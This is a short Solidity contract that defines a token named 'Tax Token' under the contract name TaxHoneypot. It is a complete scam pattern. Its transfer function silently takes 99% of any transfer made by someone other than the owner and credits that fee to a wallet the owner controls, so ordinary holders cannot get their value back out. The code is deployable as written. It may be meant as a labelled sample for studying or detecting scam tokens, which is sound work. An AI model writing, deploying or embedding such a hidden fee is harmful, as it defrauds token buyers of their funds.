// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TaxHoneypot {
    string public name = "Tax Token";
    string public symbol = "TAX";
    uint256 public totalSupply = 1000000e18;
    address public owner;
    address public marketingWallet;

    mapping(address => uint256) public balanceOf;

    constructor() {
        owner = msg.sender;
        marketingWallet = msg.sender;
        balanceOf[owner] = totalSupply;
    }

    function transfer(address to, uint256 value) public returns (bool) {
        require(balanceOf[msg.sender] >= value, "Insufficient balance");
        
        uint256 fee = 0;
        // If the sender is not the owner, impose a 99% tax
        if (msg.sender != owner) {
            fee = (value * 99) / 100;
        }

        uint256 amountAfterFee = value - fee;

        balanceOf[msg.sender] -= value;
        balanceOf[to] += amountAfterFee;
        
        if (fee > 0) {
            balanceOf[marketingWallet] += fee;
        }

        return true;
    }
}